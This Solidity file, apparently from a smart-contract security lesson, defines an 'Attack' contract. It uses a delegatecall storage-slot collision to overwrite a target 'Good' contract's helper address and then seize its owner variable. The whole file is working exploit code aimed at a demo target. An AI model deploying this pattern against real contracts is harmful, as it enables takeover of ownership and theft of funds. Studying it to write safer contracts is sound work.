//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint256 public num;

    Good public good;

    //Taking the address of the good contract in the constructor
    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        //This is the way you typecast an address to uint256
        good.setNum(uint256(uint160(address(this))));
        good.setNum(1);
    }
}
